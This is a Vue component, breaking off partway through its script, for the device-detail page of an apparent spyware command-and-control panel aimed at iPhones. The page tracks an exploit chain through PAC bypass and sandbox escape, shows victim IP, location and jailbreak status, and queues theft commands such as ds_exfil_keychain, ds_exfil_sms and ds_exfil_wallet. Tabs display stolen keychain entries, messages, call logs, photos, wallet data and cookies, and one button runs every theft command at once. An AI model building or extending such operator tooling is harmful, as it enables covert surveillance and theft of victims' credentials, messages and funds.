<template>
  <div class="device-detail-page">
    <!-- 利用进度卡片：移到界面头部，让大布局转为「顶部总览 + 下方左右分栏」更清晰 -->
    <div class="page-card exploit-progress-card" style="margin-bottom:16px;">
      <div class="page-header" style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
        <div class="page-title">利用进度</div>
        <div style="display:flex;align-items:center;gap:10px;">
          <el-tag :type="exploitProgress.statusType" size="small" effect="dark">
            {{ exploitProgress.statusText }}
          </el-tag>
          <span style="font-size:20px;font-weight:700;color:var(--el-text-color-primary);">
            {{ exploitProgress.percent }}<span style="font-size:12px;font-weight:400;color:var(--el-text-color-secondary);">%</span>
          </span>
        </div>
      </div>
      <el-progress
        :percentage="exploitProgress.percent"
        :stroke-width="14"
        :color="exploitProgress.percent >= 100 ? '#67c23a' : (exploitProgress.percent >= 70 ? '#409eff' : (exploitProgress.percent >= 35 ? '#e6a23c' : '#909399'))"
        :format="() => `${exploitProgress.percent}% · ${exploitProgress.currentStage}`"
        style="margin-bottom:18px;"
      />
      <div class="exploit-stages-grid">
        <div
          v-for="(stage, idx) in exploitProgress.stages"
          :key="stage.key"
          class="exploit-stage-item"
          :class="{
            done: stage.done,
            current: !stage.done && idx === exploitProgress.currentIndex,
            pending: !stage.done && idx !== exploitProgress.currentIndex
          }"
        >
          <div class="stage-indicator">
            <el-icon v-if="stage.done" class="stage-icon-done"><Check /></el-icon>
            <span v-else class="stage-icon-num">{{ idx + 1 }}</span>
          </div>
          <div class="stage-content">
            <div class="stage-title">
              {{ stage.label }}
              <span class="stage-percent">{{ stage.percent }}%</span>
            </div>
            <div class="stage-desc">{{ stage.desc }}</div>
          </div>
        </div>
      </div>
    </div>

    <div class="page-card" style="margin-bottom:16px;">
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
        <div style="display:flex;align-items:center;gap:12px;">
          <el-button link type="primary" @click="goBack">
            <el-icon><ArrowLeft /></el-icon>
            <span>返回列表</span>
          </el-button>
          <el-divider direction="vertical" />
          <div>
            <h3 style="margin:0;font-size:18px;">设备详情</h3>
            <span class="mono text-muted">{{ device?.device_uuid || uuid }}</span>
          </div>
        </div>
        <div>
          <el-tag v-if="isDeviceOnline" type="success" effect="dark">在线</el-tag>
          <el-tag v-else type="info" effect="plain">离线</el-tag>
        </div>
      </div>

      <el-row :gutter="16" class="info-row">
        <el-col :xs="24" :sm="24" :md="8">
          <el-descriptions :column="1" border size="small" title="基础信息">
            <el-descriptions-item label="UUID"><span class="mono">{{ device?.device_uuid || '-' }}</span></el-descriptions-item>
            <el-descriptions-item label="系统">{{ formatOS }}</el-descriptions-item>
            <el-descriptions-item label="型号">{{ formatModel }}</el-descriptions-item>
            <el-descriptions-item label="芯片">{{ device?.chipset || '-' }}</el-descriptions-item>
            <el-descriptions-item label="硬件型号">
              <span class="mono text-muted">{{ device?.hw_model || '-' }}</span>
            </el-descriptions-item>
            <el-descriptions-item label="浏览器">
              <template v-if="device?.browser_name || device?.browser_version">
                <el-tag size="small" effect="plain" :type="browserTagType">
                  {{ device?.browser_name || '-' }}
                  <span v-if="device?.browser_version" style="margin-left:4px;opacity:.75;">v{{ device.browser_version }}</span>
                </el-tag>
              </template>
              <span v-else>-</span>
            </el-descriptions-item>
            <el-descriptions-item label="内核/WebKit 版本">{{ device?.webkit_version || '-' }}</el-descriptions-item>
            <el-descriptions-item label="Safari 版本">
              <template v-if="device?.browser_name === 'Safari' && device?.browser_version">
                {{ device.browser_version }}
              </template>
              <span v-else class="text-muted">{{ device?.safari_version || '-' }}</span>
            </el-descriptions-item>
          </el-descriptions>
        </el-col>
        <el-col :xs="24" :sm="24" :md="8">
          <el-descriptions :column="1" border size="small" title="连接信息">
            <el-descriptions-item label="IP 地址">
              <span class="mono">{{ device?.ip || '-' }}</span>
              <span v-if="device?.ip_location" style="margin-left:8px;color:#909399;font-size:12px;">
                {{ device.ip_location }}
              </span>
            </el-descriptions-item>
            <el-descriptions-item label="渠道">
              <template v-if="device?.channel_name">
                <el-tag size="small" effect="plain" :style="device?.channel_color ? { background: device.channel_color + '18', color: device.channel_color, borderColor: device.channel_color + '55' } : {}">
                  {{ device.channel_name }}
                </el-tag>
                <span v-if="device?.channel_slug" class="text-muted" style="margin-left:6px;font-size:12px;">({{ device.channel_slug }})</span>
              </template>
              <span v-else>-</span>
            </el-descriptions-item>
            <el-descriptions-item label="模板">
              <template v-if="device?.template_name">
                {{ device.template_name }}
                <span v-if="device?.template_slug" class="text-muted" style="margin-left:6px;font-size:12px;">({{ device.template_slug }})</span>
              </template>
              <span v-else>-</span>
            </el-descriptions-item>
            <el-descriptions-item label="分组">
              <template v-if="device?.group_name">
                <el-tag size="small" effect="plain" :style="device?.group_color ? { background: device.group_color + '18', color: device.group_color, borderColor: device.group_color + '55' } : {}">
                  {{ device.group_name }}
                </el-tag>
              </template>
              <span v-else>&lt;未分组&gt;</span>
            </el-descriptions-item>
            <el-descriptions-item label="利用状态">
              <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
                <el-tag :type="exploitProgress.statusType" size="small" effect="plain">{{ exploitProgress.statusText }}</el-tag>
                <el-progress
                  :percentage="exploitProgress.percent"
                  :stroke-width="8"
                  :color="exploitProgress.percent >= 100 ? '#67c23a' : (exploitProgress.percent >= 70 ? '#409eff' : (exploitProgress.percent >= 35 ? '#e6a23c' : '#909399'))"
                  style="flex:1;min-width:100px;"
                  :show-text="false"
                />
                <span style="font-size:12px;color:var(--el-text-color-secondary);font-weight:600;min-width:30px;">{{ exploitProgress.percent }}%</span>
              </div>
            </el-descriptions-item>
            <el-descriptions-item label="兼容性">
              <el-tag :type="compatibleTag.type" size="small" effect="plain">{{ compatibleTag.text }}</el-tag>
            </el-descriptions-item>
          </el-descriptions>
        </el-col>
        <el-col :xs="24" :sm="24" :md="8">
          <el-descriptions :column="1" border size="small" title="时间信息">
            <el-descriptions-item label="首次上线">{{ formatDate(device?.first_seen) }}</el-descriptions-item>
            <el-descriptions-item label="最近心跳">{{ formatRelative(device?.last_seen) }}</el-descriptions-item>
            <el-descriptions-item label="最近命令">{{ device?.last_command_time ? formatRelative(device.last_command_time) : '-' }}</el-descriptions-item>
            <el-descriptions-item label="在线时长">{{ uptimeText }}</el-descriptions-item>
            <el-descriptions-item label="归属">
              <template v-if="device?.agent_id">代理 ID: {{ device.agent_id }}</template>
              <span v-else>管理员</span>
            </el-descriptions-item>
            <el-descriptions-item label="启用/禁用">
              <el-tag :type="(device?.enabled ?? 1) ? 'success' : 'danger'" size="small" effect="plain">
                {{ (device?.enabled ?? 1) ? '已启用' : '已禁用' }}
              </el-tag>
            </el-descriptions-item>
            <el-descriptions-item label="越狱/Root">
              <el-tag :type="jailbrokenTag.type" size="small" effect="plain">
                {{ jailbrokenTag.text }}
              </el-tag>
            </el-descriptions-item>
          </el-descriptions>
        </el-col>
      </el-row>

      <!-- Agent 真实能力（独立横跨三列，不再挤在连接信息里） -->
      <div style="margin-top:16px;">
        <el-descriptions :column="2" border size="small" title="Agent 真实能力（利用链各阶段上报）">
          <el-descriptions-item label="能力徽章" :span="1">
            <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
              <el-tag :type="agentCapabilitySummary.badgeType" size="small" effect="dark">
                {{ agentCapabilitySummary.badgeText }}
              </el-tag>
              <template v-if="agentCapabilities.available">
                <el-tooltip
                  placement="top"
                  :content="`NativeBridge: ${agentCapabilities.native_bridge === true ? 'YES (内核权限可用)' : (agentCapabilities.native_bridge === false ? 'NO (仅沙箱内，file/shell/keychain会失败)' : '未上报')} | SBX0 (Stage1 内存原语): ${agentCapabilities.sbx0_success === true ? 'OK' : (agentCapabilities.sbx0_success === false ? 'FAIL' : '?')} | SBX1 (Stage2 PAC 绕过): ${agentCapabilities.sbx1_success === true ? 'OK' : (agentCapabilities.sbx1_success === false ? 'FAIL' : '?')} | PE 跳过: ${agentCapabilities.pe_skipped === true ? '是' : (agentCapabilities.pe_skipped === false ? '否' : '?')}`"
                >
                  <el-tag
                    size="small"
                    effect="plain"
                    :type="agentCapabilities.native_bridge === true ? 'success' : (agentCapabilities.native_bridge === false ? 'danger' : 'info')"
                    style="border-style:dashed;cursor:help;"
                  >
                    <span style="font-weight:600;">NB:</span>
                    {{ agentCapabilities.native_bridge === true ? 'YES' : (agentCapabilities.native_bridge === false ? 'NO' : '?') }}
                    <span style="margin:0 4px;opacity:.45;">|</span>
                    <span style="font-weight:600;">SBX0:</span>
                    {{ agentCapabilities.sbx0_success === true ? 'OK' : (agentCapabilities.sbx0_success === false ? 'FAIL' : '?') }}
                    <span style="margin:0 4px;opacity:.45;">|</span>
                    <span style="font-weight:600;">SBX1:</span>
                    {{ agentCapabilities.sbx1_success === true ? 'OK' : (agentCapabilities.sbx1_success === false ? 'FAIL' : '?') }}
                    <template v-if="agentCapabilities.pe_skipped === true">
                      <span style="margin:0 4px;opacity:.45;">|</span>
                      <span style="color:var(--el-color-warning);font-weight:600;">PE跳过</span>
                    </template>
                  </el-tag>
                </el-tooltip>
              </template>
              <span v-if="!agentCapabilities.available" style="font-size:12px;color:var(--el-text-color-secondary);">（等 sandbox 数据回传后显示，hover 信号量 tag 看详细含义）</span>
            </div>
          </el-descriptions-item>
          <el-descriptions-item label="来源 / iOS 版本" :span="1">
            <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;font-size:12px;">
              <el-tag size="small" effect="plain" type="primary" :disabled="agentCapabilities.source !== 'exfil_sandbox'">
                来源: {{ agentCapabilities.source === 'exfil_sandbox' ? 'sandbox 回传' : '未回传' }}
              </el-tag>
              <span v-if="agentCapabilities.ios_version" class="mono" style="color:var(--el-text-color-secondary);">
                iOS: <strong style="color:var(--el-text-color-primary);">{{ agentCapabilities.ios_version }}</strong>
              </span>
              <span v-if="agentCapabilities.localStorage === true || agentCapabilities.sessionStorage === true || agentCapabilities.indexedDB === true"
                    style="color:var(--el-text-color-secondary);">
                <el-tag size="small" effect="plain" type="success" v-if="agentCapabilities.localStorage">LS OK</el-tag>
                <el-tag size="small" effect="plain" type="success" style="margin-left:4px;" v-if="agentCapabilities.sessionStorage">SS OK</el-tag>
                <el-tag size="small" effect="plain" type="success" style="margin-left:4px;" v-if="agentCapabilities.indexedDB">IDB OK</el-tag>
              </span>
            </div>
          </el-descriptions-item>
          <el-descriptions-item v-if="agentCapabilitySummary.summaryText" label="能力说明" :span="2">
            <span class="text-muted" style="word-break:break-all;font-size:12.5px;line-height:1.6;">
              {{ agentCapabilitySummary.summaryText }}
            </span>
          </el-descriptions-item>
        </el-descriptions>
      </div>

      <div v-if="device?.host || device?.access_path || device?.note || device?.user_agent" style="margin-top:16px;">
        <el-descriptions :column="2" border size="small" title="访问上下文">
          <el-descriptions-item label="访问 Host">
            <span class="mono">{{ device?.host || '-' }}</span>
          </el-descriptions-item>
          <el-descriptions-item label="来源 Referer">
            <span class="mono text-muted" style="word-break:break-all;">{{ device?.referer || '-' }}</span>
          </el-descriptions-item>
          <el-descriptions-item label="访问路径" :span="2">
            <span class="mono text-muted" style="word-break:break-all;">{{ device?.access_path || '-' }}</span>
          </el-descriptions-item>
          <el-descriptions-item label="User-Agent" :span="2">
            <span class="mono text-muted" style="word-break:break-all;">{{ device?.user_agent || '-' }}</span>
          </el-descriptions-item>
          <el-descriptions-item v-if="device?.note" label="备注" :span="2">
            {{ device.note }}
          </el-descriptions-item>
        </el-descriptions>
      </div>

      <div style="margin-top:16px;">
        <!-- Toolbar -->
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:8px;">
          <div>
            <span class="page-title">设备访问日志</span>
            <span v-if="logsSummary" style="margin-left:12px;font-size:12px;color:var(--el-text-color-secondary);font-family:'SF Mono','Fira Code',Consolas,monospace;">
              HTTP {{ logsSummary.http || 0 }} · CMD {{ logsSummary.command || 0 }} · EXFL {{ logsSummary.exfil || 0 }}
              · IOS <span style="color:#56b6c2;">{{ logsSummary.raw_log || 0 }}</span>
              · <span style="color:#f38ba8;">ERR {{ logsSummary.errors || 0 }}</span>
              · <span style="color:#f9e2af;">WARN {{ logsSummary.warnings || 0 }}</span>
              · <span style="color:#a6e3a1;">OK {{ logsSummary.success || 0 }}</span>
            </span>
          </div>
          <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
            <el-select v-model="logsFilterType" size="small" class="logs-type-select" placeholder="全部类型" clearable>
              <el-option label="HTTP 请求" value="http" />
              <el-option label="命令调度" value="command" />
              <el-option label="窃取上报" value="exfil" />
              <el-option label="设备生命周期" value="device" />
              <el-option label="漏洞利用" value="exploit" />
              <el-option label="iOS 日志" value="raw_log" />
            </el-select>
            <el-input v-model="logsKeyword" size="small" class="logs-search-input" placeholder="搜索标题/详情/标签..." clearable>
              <template #prefix><el-icon><Search /></el-icon></template>
            </el-input>
            <el-button size="small" :loading="logsLoading" @click="loadLogs">
              <el-icon><Refresh /></el-icon><span>刷新</span>
            </el-button>
            <el-button size="small" type="primary" plain :disabled="!filteredLogs.length" @click="copyLogs">
              <el-icon><CopyDocument /></el-icon><span>复制</span>
            </el-button>
            <el-button size="small" type="danger" plain :loading="logsClearing" @click="clearLogs">
              <el-icon><Delete /></el-icon><span>清空</span>
            </el-button>
          </div>
        </div>

        <!-- Terminal window -->
        <div class="term-window" v-loading="logsLoading">
          <div class="term-titlebar">
            <div class="term-traffic">
              <span class="term-dot term-dot-red"></span>
              <span class="term-dot term-dot-yellow"></span>
              <span class="term-dot term-dot-green"></span>
            </div>
            <span class="term-title-text">logs — {{ uuid ? uuid.slice(0, 16) + '…' : '' }} — {{ filteredLogs.length }} lines</span>
            <span v-if="logsSummary" class="term-title-count">{{ filteredLogs.length }}/{{ logsSummary.total || filteredLogs.length }}</span>
          </div>
          <div class="term-body">
            <div v-if="!logsLoading && !logs.length" class="term-empty">
              <span class="term-prompt">$</span> no logs yet — device will populate after first connection
            </div>
            <div v-else-if="!filteredLogs.length" class="term-empty">
              <span class="term-prompt">$</span> no matching logs for current filter
            </div>
            <div
              v-for="(ev, idx) in filteredLogs"
              :key="(ev.time || '') + '-' + idx"
              class="term-line"
              :class="'term-lvl-' + (ev.level || 'info')"
            >
              <span class="term-ts">{{ formatLogTime(ev.time) }}</span>
              <span class="term-tag" :class="'term-tag-' + (ev.type || 'log')">{{ termTag(ev.type) }}</span>
              <span class="term-msg">{{ ev.title || ev.detail || '-' }}</span>
              <span v-if="ev.status_code != null" class="term-sc" :class="ev.status_code >= 500 ? 'term-sc-err' : (ev.status_code >= 400 ? 'term-sc-warn' : 'term-sc-ok')">{{ ev.status_code }}</span>
              <span v-if="ev.ip && ev.ip !== 'unknown'" class="term-ip">↳ {{ ev.ip }}</span>
            </div>
          </div>
        </div>
      </div>
    </div>

    <el-row :gutter="16" class="cmd-row">
      <el-col :xs="24" :sm="24" :md="8">
        <!-- 命令执行历史：移到左侧 span-8，放在心跳时间线的上方（紧凑版列） -->
        <div class="page-card">
          <div class="page-header">
            <div class="page-title">命令执行历史</div>
            <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">
              <el-tag size="small" type="warning" effect="plain" v-if="pendingCnt">待 {{ pendingCnt }}</el-tag>
              <el-tag size="small" type="success" effect="plain" v-if="completedCnt">成 {{ completedCnt }}</el-tag>
              <el-tag size="small" type="danger" effect="plain" v-if="failedCnt">败 {{ failedCnt }}</el-tag>
              <el-button size="small" :loading="cmdLoading" @click="cmdPage = 1; loadCommands()" style="padding:4px 8px;">
                <el-icon><Refresh /></el-icon>
              </el-button>
            </div>
          </div>

          <div style="margin-bottom:8px;">
            <el-tooltip
              v-if="capabilityHint.show"
              :content="capabilityHint.desc"
              placement="top"
              effect="dark"
              :disabled="!capabilityHint.desc"
            >
              <div style="margin-bottom:8px;">
                <el-alert
                  :title="capabilityHint.title"
                  :type="capabilityHint.type"
                  show-icon
                  :closable="false"
                  style="cursor:help;"
                />
              </div>
            </el-tooltip>
            <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">
              <el-select v-model="cmdStatusFilter" size="small" placeholder="状态" clearable style="width:100px;flex:1;min-width:80px;" @change="cmdPage = 1; loadCommands()">
                <el-option label="待执行" value="pending" />
                <el-option label="执行中" value="running" />
                <el-option label="已完成" value="completed" />
                <el-option label="失败" value="failed" />
                <el-option label="已过期" value="expired" />
              </el-select>
              <el-input v-model="cmdQFilter" size="small" placeholder="搜索命令" clearable style="flex:1;min-width:100px;" @clear="cmdPage = 1; loadCommands()" @keyup.enter="cmdPage = 1; loadCommands()">
                <template #prefix><el-icon style="width:14px;height:14px;"><Search /></el-icon></template>
              </el-input>
            </div>
          </div>

          <el-table :data="cmdList" stripe v-loading="cmdLoading" size="small" style="width:100%;table-layout:fixed;">
            <el-table-column type="expand" width="36">
              <template #default="{ row }">
                <div style="padding:6px 8px;background:#fafafa;border-radius:6px;">
                  <div style="font-size:11px;color:#909399;margin-bottom:4px;">
                    ID: {{ row.id }} · 创建: {{ row.created_at ? formatRelative(row.created_at) : '-' }}
                    · 输出（{{ row.output ? row.output.length : 0 }} 字符）
                    <span v-if="row.error" style="margin-left:8px;color:#f56c6c;">错误：{{ row.error.length }} 字符</span>
                  </div>
                  <pre class="mono" style="background:#0d1117;color:#e6edf3;padding:10px;border-radius:6px;max-height:240px;overflow:auto;margin:0;white-space:pre-wrap;word-break:break-all;font-size:11.5px;line-height:1.5;">{{ row.error ? ('[ERROR] ' + row.error + (row.output ? '\n\n--- stdout ---\n' + row.output : '')) : (row.output || '<无输出>') }}</pre>
                </div>
              </template>
            </el-table-column>
            <el-table-column prop="command" label="命令" min-width="90" show-overflow-tooltip>
              <template #default="{ row }">
                <el-tooltip :content="row.command" placement="top" :disabled="!row.command || row.command.length <= 14">
                  <code class="mono" style="font-size:11.5px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">{{ row.command }}</code>
                </el-tooltip>
              </template>
            </el-table-column>
            <el-table-column prop="status" label="状态" width="58">
              <template #default="{ row }">
                <el-tag :type="cmdStatusTag(row.status)" size="small" effect="plain" style="transform:scale(.85);transform-origin:left center;">{{ cmdStatusLabel(row.status) }}</el-tag>
              </template>
            </el-table-column>
            <el-table-column label="操作" width="56" align="center">
              <template #default="{ row }">
                <div style="display:flex;gap:1px;justify-content:center;align-items:center;">
                  <el-tooltip content="取消" placement="top" v-if="row.status === 'pending'">
                    <el-button type="primary" link size="small" style="padding:2px;" @click="cancelCmd(row)">
                      <el-icon style="width:13px;height:13px;"><CircleClose /></el-icon>
                    </el-button>
                  </el-tooltip>
                  <el-tooltip content="重发" placement="top">
                    <el-button type="primary" link size="small" style="padding:2px;" @click="retryCmd(row)">
                      <el-icon style="width:13px;height:13px;"><RefreshRight /></el-icon>
                    </el-button>
                  </el-tooltip>
                  <el-tooltip content="删除" placement="top">
                    <el-button type="danger" link size="small" style="padding:2px;" @click="deleteCmd(row)">
                      <el-icon style="width:13px;height:13px;"><Delete /></el-icon>
                    </el-button>
                  </el-tooltip>
                </div>
              </template>
            </el-table-column>
          </el-table>

          <div style="margin-top:8px;display:flex;justify-content:flex-end;">
            <el-pagination
              v-model:current-page="cmdPage"
              v-model:page-size="cmdPageSize"
              :page-sizes="[10, 20, 50]"
              :total="cmdTotal"
              layout="total, prev, pager, next"
              background
              size="small"
              @current-change="loadCommands"
              @size-change="cmdPage = 1; loadCommands()"
            />
          </div>

        </div>

        <!-- 心跳时间线：放在命令执行历史下方，缩短为最近 {{ HEARTBEAT_LIMIT }} 条，支持展开全部 -->
        <div class="page-card" style="margin-top:16px;">
          <div class="page-header">
            <div class="page-title">
              心跳时间线
              <span v-if="heartbeats.length" style="margin-left:6px;font-size:12px;font-weight:400;color:var(--el-text-color-secondary);">
                {{ showAllHeartbeats ? heartbeats.length : displayHeartbeats.length }}/{{ heartbeats.length }}
              </span>
            </div>
            <el-button
              v-if="heartbeats.length > HEARTBEAT_LIMIT"
              size="small"
              link
              type="primary"
              @click="showAllHeartbeats = !showAllHeartbeats"
            >
              {{ showAllHeartbeats ? '收起' : `展开全部 (${heartbeats.length})` }}
            </el-button>
          </div>
          <el-timeline>
            <el-timeline-item
              v-for="(h, idx) in displayHeartbeats"
              :key="'hb-' + (h.id ?? ((h.created_at || h.time || 't') + '-' + idx))"
              :timestamp="formatRelative(h.created_at || h.time)"
              :type="h.status === 'online' || h.online ? 'success' : 'info'"
            >
              <div>
                <strong>{{ (h.status === 'online' || h.online) ? '心跳' : '离线' }}</strong>
                <div v-if="h.source" class="text-muted" style="font-size:11px;margin-top:2px;">来源: {{ h.source }}</div>
                <div class="text-muted" style="font-size:12px;margin-top:2px;">
                  IP: {{ h.ip || '-' }} · 电池: {{ h.battery != null ? h.battery + '%' : '-' }}
                </div>
              </div>
            </el-timeline-item>
          </el-timeline>
        </div>
      </el-col>
      <el-col :xs="24" :sm="24" :md="16">
        <div class="page-card">
          <div class="page-header">
            <div>
              <div class="page-title">命令发送</div>
              <div class="page-subtitle">发送控制命令到此设备</div>
            </div>
            <el-button type="warning" plain :disabled="commandsDisabled" @click="openRunScript">
              <el-icon><VideoPlay /></el-icon>
              <span>运行脚本</span>
            </el-button>
          </div>
          <el-alert
            v-if="commandBlockReason"
            style="margin-bottom:14px;"
            :title="commandBlockReason"
            :type="commandAlertType"
            show-icon
            :closable="false"
          />
          <div style="margin-bottom:12px;">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
              <div style="font-size:12px;color:#909399;">快捷命令模板：</div>
              <el-button
                size="small"
                type="success"
                :loading="sendingAll"
                :disabled="commandsDisabled"
                @click="sendAllCmds"
                style="margin-left:10px;"
              >
                <el-icon><Promotion /></el-icon>
                <span>一键执行全部窃取</span>
              </el-button>
            </div>
            <div style="display:flex;flex-wrap:wrap;gap:6px;">
              <el-tag
                v-for="t in cmdTemplates"
                :key="t.cmd"
                size="small"
                effect="plain"
                :style="commandsDisabled ? 'opacity:.55;cursor:not-allowed;' : 'cursor:pointer;'"
                @click="onTemplateClick(t.cmd)"
              >
                {{ t.label }}
              </el-tag>
            </div>
            <div style="font-size:11px;color:#c0c4cc;margin-top:6px;">
              提示：点击模板只是填入命令，还需点【发送命令】才会下发（或直接点【一键执行全部窃取】）
            </div>
          </div>
          <el-input
            v-model="cmdText"
            type="textarea"
            :rows="3"
            :disabled="commandsDisabled"
            placeholder="输入要执行的命令，例如：ds_exfil_keychain  或  ds_alert Hello~  或  ds_vibrate"
          />
          <div style="display:flex;gap:8px;margin-top:12px;justify-content:flex-end;">
            <el-button :disabled="commandsDisabled" @click="cmdText = ''">清空</el-button>
            <el-button type="primary" :loading="sendingCmd" :disabled="commandsDisabled" @click="sendCmd">
              <el-icon><Promotion /></el-icon>
              <span>发送命令</span>
            </el-button>
          </div>
        </div>

        <div class="page-card" style="margin-top:16px;">
          <div class="page-header">
            <div class="page-title">窃取数据</div>
          </div>
          <el-tabs v-model="activeTab">
            <el-tab-pane label="沙箱数据" name="sandbox">
              <el-alert v-if="!tabsData.sandbox?.length" type="info" show-icon :closable="false"
                title="暂无沙箱采集数据（Stage2成功后会自动上报）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.sandbox" :cols="sandboxCols" />
            </el-tab-pane>
            <el-tab-pane label="Keychain" name="keychain">
              <el-alert v-if="!tabsData.keychain?.length" type="info" show-icon :closable="false"
                title="暂无 Keychain 数据。请下发命令：ds_exfil_keychain（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.keychain" :cols="keychainCols" />
            </el-tab-pane>
            <el-tab-pane label="WiFi" name="wifi">
              <el-alert v-if="!tabsData.wifi?.length" type="info" show-icon :closable="false"
                title="暂无 WiFi 数据。请下发命令：ds_exfil_wifi（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.wifi" :cols="wifiCols" />
            </el-tab-pane>
            <el-tab-pane label="通讯录" name="contacts">
              <el-alert v-if="!tabsData.contacts?.length" type="info" show-icon :closable="false"
                title="暂无通讯录数据。请下发命令：ds_exfil_contacts（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.contacts" :cols="contactCols" />
            </el-tab-pane>
            <el-tab-pane label="短信" name="sms">
              <el-alert v-if="!tabsData.sms?.length" type="info" show-icon :closable="false"
                title="暂无短信数据。请下发命令：ds_exfil_sms（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.sms" :cols="smsCols" />
            </el-tab-pane>
            <el-tab-pane label="通话" name="calls">
              <el-alert v-if="!tabsData.calls?.length" type="info" show-icon :closable="false"
                title="暂无通话记录数据。请下发命令：ds_exfil_calls（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.calls" :cols="callCols" />
            </el-tab-pane>
            <el-tab-pane label="照片" name="photos">
              <el-alert v-if="!validPhotos.length" type="info" show-icon :closable="false"
                title="暂无照片数据。请下发命令：ds_exfil_photos（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <div v-if="validPhotos.length" class="photos-grid">
                <div v-for="p in validPhotos" :key="p.id" style="aspect-ratio:1;overflow:hidden;border-radius:6px;background:#f5f5f5;">
                  <img v-if="p.thumb" :src="p.thumb" style="width:100%;height:100%;object-fit:cover;" />
                </div>
              </div>
              <el-empty v-else description="暂无照片" style="padding:24px 0;" />
            </el-tab-pane>
            <el-tab-pane label="文件" name="files">
              <el-alert v-if="!tabsData.files?.length" type="info" show-icon :closable="false"
                title="暂无文件数据。请下发命令：ds_exfil_files / ds_file_ls（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.files" :cols="fileCols" />
            </el-tab-pane>
            <el-tab-pane label="钱包" name="wallet">
              <el-alert v-if="!tabsData.wallet?.length" type="info" show-icon :closable="false"
                title="暂无钱包数据。请下发命令：ds_exfil_wallet（需要 Stage3 沙箱逃逸成功）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.wallet" :cols="walletCols" />
            </el-tab-pane>
            <el-tab-pane label="Cookies" name="cookies">
              <el-alert v-if="!tabsData.cookies?.length" type="info" show-icon :closable="false"
                title="暂无 Cookies 数据（Safari 沙箱内自动采集）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.cookies" :cols="exfilGenericCols" />
            </el-tab-pane>
            <el-tab-pane label="Storage" name="storage">
              <el-alert v-if="!tabsData.storage?.length" type="info" show-icon :closable="false"
                title="暂无 Storage 数据（localStorage / sessionStorage，Safari 沙箱内自动采集）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.storage" :cols="exfilGenericCols" />
            </el-tab-pane>
            <el-tab-pane label="Battery" name="battery">
              <el-alert v-if="!tabsData.battery?.length" type="info" show-icon :closable="false"
                title="暂无电池数据（navigator.getBattery 自动采集）"
                style="margin-bottom:12px;" />
              <data-table :rows="tabsData.battery" :cols="exfilGenericCols" />
            </el-tab-pane>
          </el-tabs>
        </div>
      </el-col>
    </el-row>

    <el-dialog v-model="scriptDialogVisible" title="选择脚本运行" width="min(640px, 94%)" top="10vh">
      <div style="margin-bottom:10px;color:#909399;font-size:13px;">
        设备：<span class="mono">{{ uuid }}</span>
      </div>
      <el-alert
        v-if="commandBlockReason"
        style="margin-bottom:12px;"
        :title="commandBlockReason"
        :type="commandAlertType"
        show-icon
        :closable="false"
      />
      <el-table
        :data="scriptsList"
        stripe
        max-height="420"
        v-loading="scriptsLoading"
        @selection-change="(sel) => selectedScriptId = sel.length ? sel[0].id : null"
        ref="scriptTableRef"
      >
        <el-table-column type="radio" width="45" />
        <el-table-column prop="name" label="脚本名称" width="160" show-overflow-tooltip />
        <el-table-column prop="category" label="分类" width="90">
          <template #default="{ row }">
            <el-tag size="small" effect="plain" v-if="row.category">{{ row.category }}</el-tag>
            <span v-else class="text-muted">-</span>
          </template>
        </el-table-column>
        <el-table-column prop="description" label="说明" show-overflow-tooltip>
          <template #default="{ row }">
            <span v-if="row.description">{{ row.description }}</span>
            <span v-else class="text-muted">-</span>
          </template>
        </el-table-column>
        <el-table-column prop="use_count" label="运行次数" width="80" align="right">
          <template #default="{ row }">{{ row.use_count || 0 }}</template>
        </el-table-column>
      </el-table>
      <template #footer>
        <el-button @click="scriptDialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="scriptRunning" :disabled="commandsDisabled || !selectedScriptId" @click="confirmRunScript">
          运行到此设备
        </el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref, computed, onMounted, watch, nextTick, defineComponent, h } from 'vue'
import { useRoute, useRouter } from 'vue-router'
import { ElMessage, ElMessageBox } from 'element-plus'
import { ArrowLeft, Promotion, VideoPlay, Refresh, CopyDocument, Delete, Search, Clock, Check, RefreshRight, CircleClose } from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { formatDate, formatRelative, require2FA, shortUuid } from '../utils/twofa'

const route = useRoute()
const router = useRouter()
const uuid = route.params.uuid
const device = ref(null)
const heartbeats = ref([])
const HEARTBEAT_LIMIT = 3
const showAllHeartbeats = ref(false)
const displayHeartbeats = computed(() => {
  const arr = Array.isArray(heartbeats.value) ? heartbeats.value : []
  return showAllHeartbeats.value ? arr : arr.slice(0, HEARTBEAT_LIMIT)
})
// 心跳展开/收起切换日志 + 强制 nextTick 触发 timeline 竖线高度重算
watch(showAllHeartbeats, (newVal, oldVal) => {
  const total = Array.isArray(heartbeats.value) ? heartbeats.value.length : 0
  const displayCount = newVal ? total : Math.min(total, HEARTBEAT_LIMIT)
  console.log(
